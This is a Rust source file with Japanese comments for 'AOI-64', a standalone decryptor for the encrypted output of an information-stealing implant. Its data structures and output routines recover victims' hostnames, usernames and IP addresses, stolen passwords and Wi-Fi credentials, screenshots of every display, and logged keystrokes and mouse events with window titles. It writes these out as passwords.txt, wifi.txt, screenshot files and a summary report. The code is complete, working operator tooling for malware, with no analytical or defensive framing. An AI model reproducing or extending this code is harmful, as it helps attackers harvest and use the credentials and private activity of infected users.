// AOI-64 独立復号化ツール
// 依存のない単一バイナリとして、暗号スキームをこのファイル内で完結実装
use base64::{
    engine::general_purpose::{STANDARD, STANDARD_NO_PAD, URL_SAFE, URL_SAFE_NO_PAD},
    Engine,
};
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Key, Nonce,
};
use rsa::{
    pkcs8::DecodePrivateKey,
    Oaep, RsaPrivateKey,
};
use sha2::Sha256;
use rmp_serde::decode::from_slice as from_msgpack_slice;
use serde_json::Value as JValue;
use serde::{Deserialize, Serialize};
use std::{env, fs, path::Path};

// 最低限の構造体をローカル定義（未知フィールドは無視される）
#[derive(Serialize, Deserialize, Debug)]
struct SecureSystemInfo {
    hostname: String,
    username: String,
    os_name: String,
    os_version: String,
    os_arch: String,
    cpu_info: String,
    memory_total_gb: f64,
    memory_available_gb: f64,
    local_ip: String,
    public_ip: Option<String>,
    timezone: String,
    locale: String,
    #[serde(default)]
    is_virtual_machine: bool,
    #[serde(default)]
    virtual_machine_vendor: Option<String>,
    #[allow(dead_code)]
    #[serde(default)]
    uptime_hours: f64,
}

#[derive(Serialize, Deserialize, Debug, Default)]
struct SecureAuthData {
    #[serde(default)]
    passwords: Vec<String>,
    #[serde(default)]
    wifi_creds: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Default)]
struct SecureScreenshotData {
    #[serde(default)]
    primary_display: Option<String>,
    #[serde(default)]
    all_displays: Vec<String>,
    #[serde(default)]
    capture_time: String,
    #[serde(default)]
    total_count: usize,
}

#[derive(Serialize, Deserialize, Debug, Default)]
struct SecureInputEvent {
    #[serde(default)]
    timestamp: String,
    #[serde(default)]
    event_type: String,
    #[serde(default)]
    key_code: Option<u32>,
    #[serde(default)]
    mouse_x: Option<i32>,
    #[serde(default)]
    mouse_y: Option<i32>,
    #[serde(default)]
    window_title: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Default)]
struct SecureInputStatistics {
    #[serde(default)]
    total_keystrokes: u64,
    #[serde(default)]
    total_mouse_clicks: u64,
    #[serde(default)]
    session_duration_ms: u64,
}

#[derive(Serialize, Deserialize, Debug)]
struct SecureIntegratedPayload {
    system_info: SecureSystemInfo,
    auth_data: SecureAuthData,
    #[serde(default)]
    screenshot_data: Option<SecureScreenshotData>,
    #[serde(default)]
    input_events_structured: Vec<SecureInputEvent>,
    #[serde(default)]
    input_statistics: SecureInputStatistics,
    #[serde(default)]
    timestamp: String,
    #[serde(default)]
    session_id: String,
    #[serde(default)]
    encryption_key: Option<String>,
    #[serde(default)]
    encryption_nonce: Option<String>,
}

// ===== 暗号復号ユーティリティ（スタンドアロン実装） =====

fn rsa_oaep_unwrap_key_nonce_from_file(
    private_key_pem_path: &str,
    wrapped: &[u8],
) -> Result<([u8; 32], [u8; 12]), Box<dyn std::error::Error>> {
    if wrapped.is_empty() {
        return Err("Empty wrapped data".into());
    }
    if wrapped.len() < 32 || wrapped.len() > 4096 {
        return Err("Invalid wrapped data size".into());
    }

    let pem_bytes = std::fs::read(private_key_pem_path)?;
    let private_key_str = std::str::from_utf8(&pem_bytes)
        .map_err(|_| "Invalid private key PEM UTF-8")?;
    if !private_key_str.contains("-----BEGIN PRIVATE KEY-----") {
        return Err("Invalid private key PEM format".into());
    }

    let private_key = RsaPrivateKey::from_pkcs8_pem(private_key_str)
        .map_err(|_| "Failed to parse private key")?;

    let padding = Oaep::new::<Sha256>();
    let decrypted = private_key
        .decrypt(padding, wrapped)
        .map_err(|_| "RSA-OAEP unwrap failed")?;

    if decrypted.len() != 44 {
        return Err("Invalid unwrapped length (expected 44)".into());
    }

    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    key.copy_from_slice(&decrypted[..32]);
    nonce.copy_from_slice(&decrypted[32..44]);
    Ok((key, nonce))
}

fn chacha20poly1305_decrypt(
    encrypted_data: &[u8],
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if encrypted_data.is_empty() {
        return Err("Empty encrypted data".into());
    }
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    let decrypted = cipher
        .decrypt(Nonce::from_slice(nonce), encrypted_data)
        .map_err(|_| "ChaCha20-Poly1305 decryption failed")?;
    Ok(decrypted)
}

fn decode_base64_flexible(input: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if input.is_empty() {
        return Err("Empty Base64 input".into());
    }
    if let Ok(decoded) = STANDARD.decode(input) {
        return Ok(decoded);
    }
    STANDARD_NO_PAD
        .decode(input)
        .map_err(|_| "Base64 decode failed".into())
}

// ===== 出力処理 =====

fn sanitize_base64(input: &str) -> String {
    let mut s = input.trim();
    if let Some(idx) = s.find(",") {
        // data URI prefix の除去 (例: data:image/png;base64,...) っぽければ後半を使う
        let head = &s[..idx].to_ascii_lowercase();
        if head.contains("base64") {
            s = &s[idx + 1..];
        }
    }
    // 空白全削除
    s.chars().filter(|c| !c.is_ascii_whitespace()).collect()
}

fn decode_base64_image(input: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let cleaned = sanitize_base64(input);
    if cleaned.is_empty() {
        return Err("Empty screenshot data".into());
    }
    if let Ok(b) = STANDARD.decode(&cleaned) { return Ok(b); }
    if let Ok(b) = STANDARD_NO_PAD.decode(&cleaned) { return Ok(b); }
    if let Ok(b) = URL_SAFE.decode(&cleaned) { return Ok(b); }
    if let Ok(b) = URL_SAFE_NO_PAD.decode(&cleaned) { return Ok(b); }
    Err("Base64 decode failed (all variants)".into())
}

fn detect_image_ext(bytes: &[u8]) -> &'static str {
    // PNG signature
    if bytes.len() >= 8 && &bytes[..8] == b"\x89PNG\r\n\x1a\n" { return ".png"; }
    // JPEG
    if bytes.len() >= 2 && &bytes[..2] == b"\xFF\xD8" { return ".jpg"; }
    // GIF
    if bytes.len() >= 6 && (&bytes[..6] == b"GIF87a" || &bytes[..6] == b"GIF89a") { return ".gif"; }
    // BMP
    if bytes.len() >= 2 && &bytes[..2] == b"BM" { return ".bmp"; }
    // WEBP (RIFF....WEBP)
    if bytes.len() >= 12 && &bytes[..4] == b"RIFF" && &bytes[8..12] == b"WEBP" { return ".webp"; }
    ".png"
}

fn replace_ext(path: &str, new_ext: &str) -> String {
    match Path::new(path).file_stem().and_then(|s| s.to_str()) {
        Some(stem) => {
            let parent = Path::new(path).parent().unwrap_or_else(|| Path::new(""));
            parent.join(format!("{}{}", stem, new_ext)).to_string_lossy().to_string()
        }
        None => format!("{}", path),
    }
}

fn save_screenshot_base64(
    base64_data: &str,
    filename: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let bytes = decode_base64_image(base64_data)?;
    let ext = detect_image_ext(&bytes);
    let final_path = if !filename.ends_with(ext) { replace_ext(filename, ext) } else { filename.to_string() };
    fs::write(&final_path, bytes)?;
    Ok(final_path)
}

fn save_screenshots(
    output_dir: &str,
    screenshot: &SecureScreenshotData,
) -> Result<(), Box<dyn std::error::Error>> {
    let screenshot_dir = format!("{}/screenshots", output_dir);
    fs::create_dir_all(&screenshot_dir)?;

    if let Some(ref primary) = screenshot.primary_display {
        match save_screenshot_base64(primary, &format!("{}/primary.png", screenshot_dir)) {
            Ok(path) => println!("Saved primary screenshot: {}", path),
            Err(e) => {
                eprintln!("Primary screenshot decode failed: {}", e);
                let _ = fs::write(format!("{}/primary_b64.txt", screenshot_dir), sanitize_base64(primary));
            }
        }
    }
    for (i, sc) in screenshot.all_displays.iter().enumerate() {
        match save_screenshot_base64(sc, &format!("{}/display_{}.png", screenshot_dir, i + 1)) {
            Ok(path) => println!("Saved display screenshot {}: {}", i + 1, path),
            Err(e) => {
                eprintln!("Display screenshot {} decode failed: {}", i + 1, e);
                let _ = fs::write(format!("{}/display_{}_b64.txt", screenshot_dir, i + 1), sanitize_base64(sc));
            }
        }
    }

    let mut info = String::new();
    info.push_str("=== SCREENSHOT INFO ===\n");
    info.push_str(&format!("Capture time: {}\n", screenshot.capture_time));
    info.push_str(&format!("Total displays: {}\n", screenshot.total_count));
    info.push_str(&format!(
        "Primary available: {}\n",
        if screenshot.primary_display.is_some() { "Yes" } else { "No" }
    ));
    info.push_str(&format!("All displays: {}\n", screenshot.all_displays.len()));
    fs::write(format!("{}/screenshot_info.txt", output_dir), info)?;
    Ok(())
}

fn write_txt(path: &str, lines: &[String]) -> Result<(), Box<dyn std::error::Error>> {
    let mut out = String::new();
    for (i, line) in lines.iter().enumerate() {
        out.push_str(&format!("{}: {}\n", i + 1, line));
    }
    fs::write(path, out)?;
    Ok(())
}

fn write_system_info_txt(
    path: &str,
    sys: &SecureSystemInfo,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut out = String::new();
    out.push_str("=== SYSTEM INFO ===\n");
    out.push_str(&format!("Hostname: {}\n", sys.hostname));
    out.push_str(&format!("Username: {}\n", sys.username));
    out.push_str(&format!("OS: {}\n", sys.os_name));
    out.push_str(&format!("Version: {}\n", sys.os_version));
    out.push_str(&format!("Arch: {}\n", sys.os_arch));
    out.push_str(&format!("CPU: {}\n", sys.cpu_info));
    out.push_str(&format!("Memory (Total GB): {:.2}\n", sys.memory_total_gb));
    out.push_str(&format!("Memory (Avail GB): {:.2}\n", sys.memory_available_gb));
    out.push_str(&format!("Local IP: {}\n", sys.local_ip));
    if let Some(ref pip) = sys.public_ip { out.push_str(&format!("Public IP: {}\n", pip)); }
    out.push_str(&format!("Timezone: {}\n", sys.timezone));
    out.push_str(&format!("Locale: {}\n", sys.locale));
    out.push_str(&format!(
        "Virtual Machine: {}\n",
        if sys.is_virtual_machine {
            sys.virtual_machine_vendor.clone().unwrap_or_else(|| "Yes".to_string())
        } else {
            "No".to_string()
        }
    ));
    fs::write(path, out)?;
    Ok(())
}

fn create_unified_report(
    output_dir: &str,
    payload: &SecureIntegratedPayload,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut report = String::new();
    report.push_str("===============================================\n");
    report.push_str("            AOI-64 DECRYPT REPORT\n");
    report.push_str("===============================================\n\n");

    // System summary
    report.push_str("SYSTEM SUMMARY\n");
    report.push_str("-----------------------------------------------\n");
    report.push_str(&format!("Hostname: {}\n", payload.system_info.hostname));
    report.push_str(&format!("OS: {} {}\n", payload.system_info.os_name, payload.system_info.os_version));
    report.push_str(&format!("CPU: {}\n", payload.system_info.cpu_info));
    report.push_str(&format!("Local IP: {}\n", payload.system_info.local_ip));
    report.push('\n');

    // Credentials summary
    report.push_str("CREDENTIALS\n");
    report.push_str("-----------------------------------------------\n");
    report.push_str(&format!("Passwords: {} entries\n", payload.auth_data.passwords.len()));
    report.push_str(&format!("WiFi: {} entries\n", payload.auth_data.wifi_creds.len()));
    report.push('\n');

    // Screenshot summary
    report.push_str("SCREENSHOTS\n");
    report.push_str("-----------------------------------------------\n");
    if let Some(ref s) = payload.screenshot_data {
        report.push_str(&format!("Total: {}\n", s.total_count));
        report.push_str(&format!("Saved files in: {}/screenshots\n", output_dir));
    } else {
        report.push_str("No screenshot data\n");
    }
    report.push('\n');

    fs::write(format!("{}/unified_report.txt", output_dir), report)?;
    Ok(())
}

// JSONライクなMessagePackペイロードから期待出力を生成
fn process_json_like_payload(
    output_dir: &str,
    val: &JValue,
) -> Result<(), Box<dyn std::error::Error>> {
    // payload.json（全体）
    fs::write(
        format!("{}/payload.json", output_dir),
        serde_json::to_string_pretty(val)?,
    )?;
    // オブジェクト形式 or 配列形式の両対応
    if val.is_object() {
        // ---- オブジェクト形式 ----
        // system_info
        if let Some(sys) = val.get("system_info") {
            let hostname = sys.get("hostname").and_then(|v| v.as_str()).unwrap_or("");
            let username = sys.get("username").and_then(|v| v.as_str()).unwrap_or("");
            let os_name = sys.get("os_name").and_then(|v| v.as_str()).unwrap_or("");
            let os_version = sys.get("os_version").and_then(|v| v.as_str()).unwrap_or("");
            let os_arch = sys.get("os_arch").and_then(|v| v.as_str()).unwrap_or("");
            let cpu = sys.get("cpu_info").and_then(|v| v.as_str()).unwrap_or("");
            let mem_total = sys.get("memory_total_gb").and_then(|v| v.as_f64()).unwrap_or(0.0);
            let mem_avail = sys.get("memory_available_gb").and_then(|v| v.as_f64()).unwrap_or(0.0);
            let local_ip = sys.get("local_ip").and_then(|v| v.as_str()).unwrap_or("");
            let public_ip = sys.get("public_ip").and_then(|v| v.as_str()).unwrap_or("");
            let timezone = sys.get("timezone").and_then(|v| v.as_str()).unwrap_or("");
            let locale = sys.get("locale").and_then(|v| v.as_str()).unwrap_or("");
            let is_vm = sys.get("is_virtual_machine").and_then(|v| v.as_bool()).unwrap_or(false);
            let vm_vendor = sys.get("virtual_machine_vendor").and_then(|v| v.as_str()).unwrap_or("");

            let mut out = String::new();
            out.push_str("=== SYSTEM INFO ===\n");
            if !hostname.is_empty() { out.push_str(&format!("Hostname: {}\n", hostname)); }
            if !username.is_empty() { out.push_str(&format!("Username: {}\n", username)); }
            if !os_name.is_empty() || !os_version.is_empty() {
                out.push_str(&format!("OS: {} {}\n", os_name, os_version));
            }
            if !os_arch.is_empty() { out.push_str(&format!("Arch: {}\n", os_arch)); }
            if !cpu.is_empty() { out.push_str(&format!("CPU: {}\n", cpu)); }
            if mem_total > 0.0 { out.push_str(&format!("Memory (Total GB): {:.2}\n", mem_total)); }
            if mem_avail > 0.0 { out.push_str(&format!("Memory (Avail GB): {:.2}\n", mem_avail)); }
            if !local_ip.is_empty() { out.push_str(&format!("Local IP: {}\n", local_ip)); }
            if !public_ip.is_empty() { out.push_str(&format!("Public IP: {}\n", public_ip)); }
            if !timezone.is_empty() { out.push_str(&format!("Timezone: {}\n", timezone)); }
            if !locale.is_empty() { out.push_str(&format!("Locale: {}\n", locale)); }
            out.push_str(&format!("Virtual Machine: {}\n", if is_vm { if vm_vendor.is_empty() {"Yes"} else {vm_vendor} } else {"No"}));
            fs::write(format!("{}/system_info.txt", output_dir), out)?;
        }

        // auth_data
        if let Some(auth) = val.get("auth_data") {
            if let Some(passwords) = auth.get("passwords").and_then(|v| v.as_array()) {
                let lines: Vec<String> = passwords.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect();
                if !lines.is_empty() {
                    write_txt(&format!("{}/passwords.txt", output_dir), &lines)?;
                }
            }
            if let Some(wifi) = auth.get("wifi_creds").and_then(|v| v.as_array()) {
                let lines: Vec<String> = wifi.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect();
                if !lines.is_empty() {
                    write_txt(&format!("{}/wifi.txt", output_dir), &lines)?;
                }
            }
        }

        // screenshots
        if let Some(sc) = val.get("screenshot_data").and_then(|v| v.as_object()) {
            let mut data = SecureScreenshotData::default();
            if let Some(p) = sc.get("primary_display").and_then(|v| v.as_str()) { data.primary_display = Some(p.to_string()); }
            if let Some(arr) = sc.get("all_displays").and_then(|v| v.as_array()) {
                data.all_displays = arr.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect();
            }
            if let Some(ct) = sc.get("capture_time").and_then(|v| v.as_str()) { data.capture_time = ct.to_string(); }
            if let Some(t) = sc.get("total_count").and_then(|v| v.as_u64()) { data.total_count = t as usize; }
            let _ = save_screenshots(output_dir, &data);
        }

        // summary
        let mut summary = String::new();
        summary.push_str("AOI-64 Decryption Summary\n");
        summary.push_str("==========================\n");
        if let Some(ts) = val.get("timestamp").and_then(|v| v.as_str()) {
            summary.push_str(&format!("Timestamp: {}\n", ts));
        }
        if let Some(sid) = val.get("session_id").and_then(|v| v.as_str()) {
            summary.push_str(&format!("Session: {}\n", sid));
        }
        fs::write(format!("{}/unified_report.txt", output_dir), summary)?;
    } else if let Some(arr) = val.as_array() {
        // ---- 配列形式（tuple構造） ----
        // system_info at index 0 (array)
        if let Some(sys) = arr.get(0).and_then(|v| v.as_array()) {
            // 順序: hostname, username, os_name, os_version, os_arch, cpu_info,
            // memory_total_gb, memory_available_gb, disk_info, uptime_hours,
            // local_ip, public_ip, network_interfaces, timezone, locale,
            // is_virtual_machine, virtual_machine_vendor
            let hostname = sys.get(0).and_then(|v| v.as_str()).unwrap_or("");
            let username = sys.get(1).and_then(|v| v.as_str()).unwrap_or("");
            let os_name = sys.get(2).and_then(|v| v.as_str()).unwrap_or("");
            let os_version = sys.get(3).and_then(|v| v.as_str()).unwrap_or("");
            let os_arch = sys.get(4).and_then(|v| v.as_str()).unwrap_or("");
            let cpu = sys.get(5).and_then(|v| v.as_str()).unwrap_or("");
            let mem_total = sys.get(6).and_then(|v| v.as_f64()).unwrap_or(0.0);
            let mem_avail = sys.get(7).and_then(|v| v.as_f64()).unwrap_or(0.0);
            let local_ip = sys.get(10).and_then(|v| v.as_str()).unwrap_or("");
            let public_ip = sys.get(11).and_then(|v| v.as_str()).unwrap_or("");
            let timezone = sys.get(13).and_then(|v| v.as_str()).unwrap_or("");
            let locale = sys.get(14).and_then(|v| v.as_str()).unwrap_or("");
            let is_vm = sys.get(15).and_then(|v| v.as_bool()).unwrap_or(false);
            let vm_vendor = sys.get(16).and_then(|v| v.as_str()).unwrap_or("");

            let mut out = String::new();
            out.push_str("=== SYSTEM INFO ===\n");
            if !hostname.is_empty() { out.push_str(&format!("Hostname: {}\n", hostname)); }
            if !username.is_empty() { out.push_str(&format!("Username: {}\n", username)); }
            if !os_name.is_empty() || !os_version.is_empty() { out.push_str(&format!("OS: {} {}\n", os_name, os_version)); }
            if !os_arch.is_empty() { out.push_str(&format!("Arch: {}\n", os_arch)); }
            if !cpu.is_empty() { out.push_str(&format!("CPU: {}\n", cpu)); }
            if mem_total > 0.0 { out.push_str(&format!("Memory (Total GB): {:.2}\n", mem_total)); }
            if mem_avail > 0.0 { out.push_str(&format!("Memory (Avail GB): {:.2}\n", mem_avail)); }
            if !local_ip.is_empty() { out.push_str(&format!("Local IP: {}\n", local_ip)); }
            if !public_ip.is_empty() { out.push_str(&format!("Public IP: {}\n", public_ip)); }
            if !timezone.is_empty() { out.push_str(&format!("Timezone: {}\n", timezone)); }
            if !locale.is_empty() { out.push_str(&format!("Locale: {}\n", locale)); }
            out.push_str(&format!("Virtual Machine: {}\n", if is_vm { if vm_vendor.is_empty() {"Yes"} else {vm_vendor} } else {"No"}));
            fs::write(format!("{}/system_info.txt", output_dir), out)?;
        }

        // auth_data at index 1 (array)
        if let Some(auth) = arr.get(1).and_then(|v| v.as_array()) {
            // 0: collected_at_unix, 1: passwords[], 2: wifi_creds[]
            if let Some(pws) = auth.get(1).and_then(|v| v.as_array()) {
                let lines: Vec<String> = pws.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect();
                if !lines.is_empty() { write_txt(&format!("{}/passwords.txt", output_dir), &lines)?; }
            }
            if let Some(wifi) = auth.get(2).and_then(|v| v.as_array()) {
                let lines: Vec<String> = wifi.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect();
                if !lines.is_empty() { write_txt(&format!("{}/wifi.txt", output_dir), &lines)?; }
            }
        }

        // screenshot_data at index 2 (Option -> null or array)
        if let Some(scroot) = arr.get(2) {
            if let Some(sc) = scroot.as_array() {
                // 順序: primary_display, all_displays, capture_time, total_count
                let mut data = SecureScreenshotData::default();
                data.primary_display = sc.get(0).and_then(|v| v.as_str()).map(|s| s.to_string());
                if let Some(arrd) = sc.get(1).and_then(|v| v.as_array()) {
                    data.all_displays = arrd.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect();
                }
                if let Some(ct) = sc.get(2).and_then(|v| v.as_str()) { data.capture_time = ct.to_string(); }
                if let Some(tc) = sc.get(3).and_then(|v| v.as_u64()) { data.total_count = tc as usize; }
                let _ = save_screenshots(output_dir, &data);
            }
        }

        // timestamp/session at index 5/6
        let mut summary = String::new();
        summary.push_str("AOI-64 Decryption Summary\n");
        summary.push_str("==========================\n");
        if let Some(ts) = arr.get(5).and_then(|v| v.as_str()) { summary.push_str(&format!("Timestamp: {}\n", ts)); }
        if let Some(sid) = arr.get(6).and_then(|v| v.as_str()) { summary.push_str(&format!("Session: {}\n", sid)); }
        fs::write(format!("{}/unified_report.txt", output_dir), summary)?;
    }

    Ok(())
}

// ===== 復号実処理 =====

fn decrypt_with_rsa_hybrid(
    data_file: &str,
    private_key_path: &str,
    wrapped_key_file: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    // 入力検証
    if !Path::new(data_file).exists() {
        return Err(format!("Data file not found: {}", data_file).into());
    }
    if !Path::new(private_key_path).exists() {
        return Err(format!("Private key not found: {}", private_key_path).into());
    }
    if !Path::new(wrapped_key_file).exists() {
        return Err(format!("Wrapped key file not found: {}", wrapped_key_file).into());
    }

    // ラップ解除
    let wrapped = fs::read(wrapped_key_file)?;
    let (key, nonce) = rsa_oaep_unwrap_key_nonce_from_file(private_key_path, &wrapped)?;

    // 復号
    let encrypted = fs::read(data_file)?;
    let decrypted = chacha20poly1305_decrypt(&encrypted, &key, &nonce)?;

    // 型付きMessagePackとして解釈を試行
    let base_name = Path::new(data_file)
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or("output");
    let output_dir = format!("{}_decrypted", base_name);
    fs::create_dir_all(&output_dir)?;

    // 柔軟にMessagePackを汎用JSON値へ復元して処理
    if let Ok(val) = from_msgpack_slice::<JValue>(&decrypted) {
        process_json_like_payload(&output_dir, &val)?;
        println!("Decryption succeeded. Output: {}", output_dir);
    } else if let Ok(payload) = from_msgpack_slice::<SecureIntegratedPayload>(&decrypted) {
        // 旧互換: 事前に定義した簡易型でも処理可能ならそのまま処理
        let _ = fs::write(
            format!("{}/payload.json", output_dir),
            serde_json::to_string_pretty(&payload).unwrap_or_else(|_| "{}".to_string()),
        );
        write_system_info_txt(&format!("{}/system_info.txt", output_dir), &payload.system_info)?;
        if !payload.auth_data.passwords.is_empty() {
            write_txt(&format!("{}/passwords.txt", output_dir), &payload.auth_data.passwords)?;
        }
        if !payload.auth_data.wifi_creds.is_empty() {
            write_txt(&format!("{}/wifi.txt", output_dir), &payload.auth_data.wifi_creds)?;
        }
        if let Some(ref s) = payload.screenshot_data {
            let _ = save_screenshots(&output_dir, s);
        }
        create_unified_report(&output_dir, &payload)?;
        println!("Decryption succeeded. Output: {}", output_dir);
    } else {
        // テキストとして保存 or バイナリ
        if let Ok(text) = std::str::from_utf8(&decrypted) {
            fs::write(format!("{}/decrypted.txt", output_dir), text)?;
        } else {
            fs::write(format!("{}/decrypted.bin", output_dir), &decrypted)?;
        }
        println!("Decryption succeeded (raw). Output: {}", output_dir);
    }

    Ok(())
}

fn _decrypt_with_manual_keys(
    data_file: &str,
    key_b64: &str,
    nonce_b64: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    if !Path::new(data_file).exists() {
        return Err(format!("Data file not found: {}", data_file).into());
    }
    let key = decode_base64_flexible(key_b64)?;
    let nonce = decode_base64_flexible(nonce_b64)?;
    if key.len() != 32 || nonce.len() != 12 {
        return Err("Invalid key/nonce lengths".into());
    }
    let mut key_arr = [0u8; 32];
    let mut nonce_arr = [0u8; 12];
    key_arr.copy_from_slice(&key);
    nonce_arr.copy_from_slice(&nonce);
    let enc = fs::read(data_file)?;
    let dec = chacha20poly1305_decrypt(&enc, &key_arr, &nonce_arr)?;
    let base_name = Path::new(data_file).file_stem().and_then(|s| s.to_str()).unwrap_or("output");
    fs::write(format!("{}_manual_decrypted.bin", base_name), dec)?;
    Ok(())
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 4 {
        eprintln!("Usage: decrypt <encrypted_data.enc> <private_key.pem> <wrapped_key.bin>");
        std::process::exit(1);
    }

    let data_file = &args[1];
    let private_key_path = &args[2];
    let wrapped_key_file = &args[3];

    if let Err(e) = decrypt_with_rsa_hybrid(data_file, private_key_path, wrapped_key_file) {
        eprintln!("Decryption failed: {}", e);
        std::process::exit(2);
    }
}